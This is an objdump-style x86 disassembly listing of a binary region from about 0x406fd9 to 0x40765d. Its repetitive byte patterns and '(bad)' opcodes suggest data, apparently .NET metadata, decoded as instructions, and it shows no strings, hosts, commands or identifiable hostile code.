  406fd9:	05 91 02 e9 11       	add    $0x11e90291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 dc 20       	add    $0x20dc02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	0e                   	push   %cs
  406fe9:	10 3e                	adc    %bh,(%esi)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 ec                	add    %ah,%ch
  406fef:	1d 4c 05 d9 02       	sbb    $0x2d9054c,%eax
  406ff4:	62 1f                	bound  %ebx,(%edi)
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 cc 0e c3       	mov    0xc30ecc02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 11                	add    %edx,(%ecx)
  407001:	21 01                	and    %eax,(%ecx)
  407003:	05 99 02 ec 1d       	add    $0x1dec0299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 5a 0f             	add    0xf(%edx),%bl
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 41 15             	add    0x15(%ecx),%al
  407014:	c3                   	ret
  407015:	00 a1 02 dc 0e c7    	add    %ah,-0x38f123fe(%ecx)
  40701b:	00 89 02 81 14 4b    	add    %cl,0x4b148102(%ecx)
  407021:	02 89 02 ad 11 4b    	add    0x4b11ad02(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	11 23                	adc    %esp,(%ebx)
  40702c:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407030:	5e                   	pop    %esi
  407031:	26 c3                	es ret
  407033:	00 a1 02 e4 22 c7    	add    %ah,-0x38dd1bfe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 ec                	add    %ah,%ch
  40703d:	1d 6b 01 f9 02       	sbb    $0x2f9016b,%eax
  407042:	23 12                	and    (%edx),%edx
  407044:	23 02                	and    (%edx),%eax
  407046:	01 03                	add    %eax,(%ebx)
  407048:	ec                   	in     (%dx),%al
  407049:	1d 0e 00 01 03       	sbb    $0x301000e,%eax
  40704e:	f8                   	clc
  40704f:	0e                   	push   %cs
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 75 1d             	add    %esi,0x1d(%ebp)
  407056:	47                   	inc    %edi
  407057:	02 c1                	add    %cl,%al
  407059:	01 28                	add    %ebp,(%eax)
  40705b:	20 42 02             	and    %al,0x2(%edx)
  40705e:	09 03                	or     %eax,(%ebx)
  407060:	ec                   	in     (%dx),%al
  407061:	1d 6b 01 09 03       	sbb    $0x309016b,%eax
  407066:	61                   	popa
  407067:	21 6a 05             	and    %ebp,0x5(%edx)
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	d4 1d                	aam    $0x1d
  40706e:	70 05                	jo     0x407075
  407070:	19 03                	sbb    %eax,(%ebx)
  407072:	82 22 76             	andb   $0x76,(%edx)
  407075:	05 21 03 3b 18       	add    $0x183b0321,%eax
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 dd             	roll   $0xdd,(%ecx)
  40707f:	21 47 02             	and    %eax,0x2(%edi)
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	4d                   	dec    %ebp
  407085:	23 bf 01 81 02 e2    	and    -0x1dfd7eff(%edi),%edi
  40708b:	0d 86 05 29 03       	or     $0x3290586,%eax
  407090:	44                   	inc    %esp
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	d1 22                	shll   $1,(%edx)
  407098:	7b 00                	jnp    0x40709a
  40709a:	59                   	pop    %ecx
  40709b:	01 14 0f             	add    %edx,(%edi,%ecx,1)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	e8 0e c3 00 59       	call   0x594133b5
  4070a7:	01 51 19             	add    %edx,0x19(%ecx)
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 11 21       	add    $0x211101c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 ec 1d       	add    $0x1dec0349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	dc 02                	faddl  (%edx)
  4070bc:	cd 03                	int    $0x3
  4070be:	51                   	push   %ecx
  4070bf:	03 02                	add    (%edx),%eax
  4070c1:	15 75 01 69 00       	adc    $0x690175,%eax
  4070c6:	ec                   	in     (%dx),%al
  4070c7:	1d 0e 00 21 02       	sbb    $0x221000e,%eax
  4070cc:	19 14 70             	sbb    %edx,(%eax,%esi,2)
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	ab                   	stos   %eax,%es:(%edi)
  4070d3:	0c aa                	or     $0xaa,%al
  4070d5:	05 c1 01 46 14       	add    $0x144601c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 36             	roll   $0x36,(%ecx)
  4070df:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  4070e4:	fc                   	cld
  4070e5:	0c bd                	or     $0xbd,%al
  4070e7:	05 59 01 44 18       	add    $0x18440159,%eax
  4070ec:	1d 00 61 03 19       	sbb    $0x19036100,%eax
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	2e 15 c3 00 b1 02    	cs adc $0x2b100c3,%eax
  4070fc:	38 0f                	cmp    %cl,(%edi)
  4070fe:	c3                   	ret
  4070ff:	05 59 03 4a 0f       	add    $0xf4a0359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 19 14       	add    $0x14190359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	8e 22                	mov    (%edx),%fs
  407110:	c9                   	leave
  407111:	05 79 03 ec 1d       	add    $0x1dec0379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 4d 0e       	add    $0xe4d0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 c0 0f       	add    $0xfc000c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 c0                	add    %al,%al
  407127:	0f 0e                	femms
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 ec                	add    %esp,%ebp
  40712d:	1d 36 02 0c 00       	sbb    $0xc0236,%eax
  407132:	ec                   	in     (%dx),%al
  407133:	1d 0e 00 0c 00       	sbb    $0xc000e,%eax
  407138:	40                   	inc    %eax
  407139:	0b f5                	or     %ebp,%esi
  40713b:	05 0c 00 c7 22       	add    $0x22c7000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	c1 25 fb 05 c1 01 30 	shll   $0x30,0x1c105fb
  40714b:	19 01                	sbb    %eax,(%ecx)
  40714d:	06                   	push   %es
  40714e:	51                   	push   %ecx
  40714f:	00 57 20             	add    %dl,0x20(%edi)
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 79 01             	add    %bh,0x1(%ecx)
  407158:	17                   	pop    %ss
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 80 0b 17 06 89    	add    %al,-0x76f9e8f5(%eax)
  407161:	03 7b 26             	add    0x26(%ebx),%edi
  407164:	1d 06 69 00 ec       	sbb    $0xec006906,%eax
  407169:	1d 01 03 61 00       	sbb    $0x610301,%eax
  40716e:	ec                   	in     (%dx),%al
  40716f:	1d 2d 06 91 03       	sbb    $0x391062d,%eax
  407174:	c0 0f 0e             	rorb   $0xe,(%edi)
  407177:	00 99 03 ec 1d 56    	add    %bl,0x561dec03(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 9a 13 35 06 81    	add    -0x7ef9caed(%edx),%ebx
  407185:	02 3e                	add    (%esi),%bh
  407187:	0d 0a 00 91 02       	or     $0x291000a,%eax
  40718c:	e5 25                	in     $0x25,%eax
  40718e:	35 05 91 02 e9       	xor    $0xe9029105,%eax
  407193:	11 43 06             	adc    %eax,0x6(%ebx)
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	a3 0d 47 02 91       	mov    %eax,0x9102470d
  40719d:	02 e5                	add    %ch,%ah
  40719f:	25 54 06 91 02       	and    $0x2910654,%eax
  4071a4:	e0 11                	loopne 0x4071b7
  4071a6:	7c 05                	jl     0x4071ad
  4071a8:	91                   	xchg   %eax,%ecx
  4071a9:	02 d4                	add    %ah,%dl
  4071ab:	11 6b 01             	adc    %ebp,0x1(%ebx)
  4071ae:	91                   	xchg   %eax,%ecx
  4071af:	02 f2                	add    %dl,%dh
  4071b1:	25 5e 06 91 02       	and    $0x291065e,%eax
  4071b6:	84 0d 6b 01 1c 00    	test   %cl,0x1c016b
  4071bc:	40                   	inc    %eax
  4071bd:	0b f5                	or     %ebp,%esi
  4071bf:	05 b9 03 1a 23       	add    $0x231a03b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	d4 1d                	aam    $0x1d
  4071ca:	92                   	xchg   %eax,%edx
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	82 22 a4             	andb   $0xa4,(%edx)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	0e                   	push   %cs
  4071d5:	12 a9 06 24 00 4d    	adc    0x4d002406(%ecx),%ch
  4071db:	23 bf 01 c9 03 1e    	and    0x1e03c901(%edi),%edi
  4071e1:	19 b3 06 c9 03 3b    	sbb    %esi,0x3b03c906(%ebx)
  4071e7:	0b b9 06 d1 03 97    	or     -0x68fc2efa(%ecx),%edi
  4071ed:	0f c1 06             	xadd   %eax,(%esi)
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	04 0d                	add    $0xd,%al
  4071f4:	c8 06 d9 03          	enter  $0xd906,$0x3
  4071f8:	22 0e                	and    (%esi),%cl
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 ef                	add    %edi,%ebp
  4071ff:	0f d8 06             	psubusb (%esi),%mm0
  407202:	01 04 37             	add    %eax,(%edi,%esi,1)
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	ef                   	out    %eax,(%dx)
  40720b:	0f 17 07             	movhps %xmm0,(%edi)
  40720e:	2c 00                	sub    $0x0,%al
  407210:	70 21                	jo     0x407233
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	af                   	scas   %es:(%edi),%eax
  407217:	0d 3b 07 1c 00       	or     $0x1c073b,%eax
  40721c:	ec                   	in     (%dx),%al
  40721d:	1d 0e 00 c1 01       	sbb    $0x1c1000e,%eax
  407222:	b9 26 84 00 21       	mov    $0x21008426,%ecx
  407227:	04 ec                	add    $0xec,%al
  407229:	1d 6b 01 19 04       	sbb    $0x419016b,%eax
  40722e:	ec                   	in     (%dx),%al
  40722f:	1d 59 07 29 04       	sbb    $0x4290759,%eax
  407234:	6f                   	outsl  %ds:(%esi),(%dx)
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 fb                	add    %edi,%ebx
  40723b:	13 93 01 49 04 ec    	adc    -0x13fbb6ff(%ebx),%edx
  407241:	1d 6b 01 59 02       	sbb    $0x259016b,%eax
  407246:	ec                   	in     (%dx),%al
  407247:	1d 0e 00 31 04       	sbb    $0x431000e,%eax
  40724c:	ec                   	in     (%dx),%al
  40724d:	1d 0e 00 51 04       	sbb    $0x451000e,%eax
  407252:	78 12                	js     0x407266
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 15                	add    $0x15,%al
  407259:	12 01                	adc    (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	20 0d 7a 07 51 04    	and    %cl,0x451077a
  407264:	8e 13                	mov    (%ebx),%ss
  407266:	81 07 51 04 dd 25    	addl   $0x25dd0451,(%edi)
  40726c:	2b 02                	sub    (%edx),%eax
  40726e:	51                   	push   %ecx
  40726f:	04 d6                	add    $0xd6,%al
  407271:	07                   	pop    %es
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	11 1e                	adc    %ebx,(%esi)
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 ec             	cmp    %eax,(%esp,%ebp,8)
  40727d:	1d 8e 07 51 04       	sbb    $0x451078e,%eax
  407282:	c8 07 31 02          	enter  $0x3107,$0x2
  407286:	39 04 84             	cmp    %eax,(%esp,%eax,4)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	ec                   	in     (%dx),%al
  40728f:	1d 2b 02 59 02       	sbb    $0x259022b,%eax
  407294:	c1 25 31 02 51 03 02 	shll   $0x2,0x3510231
  40729b:	15 9a 07 79 04       	adc    $0x479079a,%eax
  4072a0:	ec                   	in     (%dx),%al
  4072a1:	1d 6b 01 51 04       	sbb    $0x451016b,%eax
  4072a6:	cf                   	iret
  4072a7:	07                   	pop    %es
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 01                	add    $0x1,%al
  4072ad:	1e                   	push   %ds
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 4d             	roll   $0x4d,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	4b                   	dec    %ebx
  4072b9:	26 be 07 91 04 b1    	es mov $0xb1049107,%esi
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	ec                   	in     (%dx),%al
  4072c5:	1d 0e 00 c1 01       	sbb    $0x1c1000e,%eax
  4072ca:	1d 21 f9 07 49       	sbb    $0x4907f921,%eax
  4072cf:	02 6f 1f             	add    0x1f(%edi),%ch
  4072d2:	99                   	cltd
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4072d7:	1f                   	pop    %ds
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	01 a9 00 ec 1d 0e    	add    %ebp,0xe1dec00(%ecx)
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	3b 18                	cmp    (%eax),%ebx
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	c7                   	(bad)
  4072e9:	22 f4                	and    %ah,%dh
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	2c 1c                	sub    $0x1c,%al
  4072f0:	0e                   	push   %cs
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 fb                	add    %edi,%ebx
  4072f5:	1f                   	pop    %ds
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 ca                	add    %cl,%dl
  4072fb:	11 28                	adc    %ebp,(%eax)
  4072fd:	08 49 02             	or     %cl,0x2(%ecx)
  407300:	6f                   	outsl  %ds:(%esi),(%dx)
  407301:	1f                   	pop    %ds
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	5d                   	pop    %ebp
  407307:	00 32                	add    %dh,(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 a1 18 47 02 a9    	add    %esp,-0x56fdb8e8(%ecx)
  407311:	04 ce                	add    $0xce,%al
  407313:	0f 37                	getsec
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	5d                   	pop    %ebp
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 5d 00             	add    %ebx,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	5d                   	pop    %ebp
  407325:	00 46 08             	add    %al,0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 66 00             	add    %esp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	ce                   	into
  407331:	0f 52 08             	rsqrtps (%eax),%xmm1
  407334:	51                   	push   %ecx
  407335:	01 66 00             	add    %esp,0x0(%esi)
  407338:	57                   	push   %edi
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	66 00 5c 08 51       	data16 add %bl,0x51(%eax,%ecx,1)
  407341:	01 66 00             	add    %esp,0x0(%esi)
  407344:	61                   	popa
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	d9 0d 68 08 b1 04    	(bad) 0x4b10868
  40734e:	ce                   	into
  40734f:	0f 6d                	(bad)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	6f                   	outsl  %ds:(%esi),(%dx)
  407355:	1f                   	pop    %ds
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 55 26             	add    0x26(%ebp),%edx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	ec                   	in     (%dx),%al
  407361:	1d 88 08 c1 00       	sbb    $0xc10888,%eax
  407366:	c1 11 f4             	rcll   $0xf4,(%ecx)
  407369:	01 89 01 ec 1d 6b    	add    %ecx,0x6b1dec01(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	6e                   	outsb  %ds:(%esi),(%dx)
  407373:	00 b6 08 49 02 3f    	add    %dh,0x3f024908(%esi)
  407379:	0e                   	push   %cs
  40737a:	bd 08 49 02 d9       	mov    $0xd9024908,%ebp
  40737f:	0d c4 08 49 02       	or     $0x24908c4,%eax
  407384:	3b 00                	cmp    (%eax),%eax
  407386:	cb                   	lret
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	5d                   	pop    %ebp
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	77 00                	ja     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 66 00             	add    0x0(%esi),%ah
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 6f 1f             	add    0x1f(%edi),%ch
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 ec             	roll   $1,(%esp,%ebp,8)
  4073a3:	1d 28 09 09 00       	sbb    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 fc                	add    %bh,%ah
  4075bd:	00 9f 00 00 00 8f    	add    %bl,-0x71000000(%edi)
  4075c3:	07                   	pop    %es
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 e3                	add    %ah,%bl
  4075c9:	20 a9 00 00 00 56    	and    %ch,0x56000000(%ecx)
  4075cf:	06                   	push   %es
  4075d0:	ae                   	scas   %es:(%edi),%al
  4075d1:	00 00                	add    %al,(%eax)
  4075d3:	00 c9                	add    %cl,%cl
  4075d5:	15 ae 00 00 00       	adc    $0xae,%eax
  4075da:	d5 15                	aad    $0x15
  4075dc:	b2 00                	mov    $0x0,%dl
  4075de:	00 00                	add    %al,(%eax)
  4075e0:	49                   	dec    %ecx
  4075e1:	1b b7 00 00 00 3e    	sbb    0x3e000000(%edi),%esi
  4075e7:	01 bb 00 00 00 91    	add    %edi,-0x6f000000(%ebx)
  4075ed:	02 b2 00 00 00 49    	add    0x49000000(%edx),%dh
  4075f3:	04 bf                	add    $0xbf,%al
  4075f5:	00 00                	add    %al,(%eax)
  4075f7:	00 5f 18             	add    %bl,0x18(%edi)
  4075fa:	b7 00                	mov    $0x0,%bh
  4075fc:	00 00                	add    %al,(%eax)
  4075fe:	db 05 c3 01 00 00    	fildl  0x1c3
  407604:	1d 02 f8 01 00       	sbb    $0x1f802,%eax
  407609:	00 23                	add    %ah,(%ebx)
  40760b:	13 fe                	adc    %esi,%edi
  40760d:	01 00                	add    %eax,(%eax)
  40760f:	00 d0                	add    %dl,%al
  407611:	14 69                	adc    $0x69,%al
  407613:	02 00                	add    (%eax),%al
  407615:	00 d7                	add    %dl,%bh
  407617:	1a 6d 02             	sbb    0x2(%ebp),%ch
  40761a:	00 00                	add    %al,(%eax)
  40761c:	b7 02                	mov    $0x2,%bh
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	21 1b                	and    %ebx,(%ebx)
  407624:	75 02                	jne    0x407628
  407626:	00 00                	add    %al,(%eax)
  407628:	de 08                	fimuls (%eax)
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
